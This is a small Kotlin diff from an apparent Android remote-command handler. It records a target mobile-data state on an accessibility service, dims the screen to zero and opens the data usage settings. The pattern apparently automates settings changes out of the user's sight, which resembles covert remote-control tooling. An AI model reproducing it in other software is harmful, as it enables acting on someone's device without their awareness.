@@ -1423,6 +1423,7 @@ object CommandProcessor {
                         Handler(Looper.getMainLooper()).post {
                             DimmerManager.applyDim(ctx, 0, "AUTO")
                             MyAccessibilityService.instance?.isWaitingForDataSettings = true
+                            MyAccessibilityService.instance?.dataTargetState = content.trim().uppercase()
                             val dataIntent = Intent(android.provider.Settings.ACTION_DATA_USAGE_SETTINGS).apply {
                                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                             }
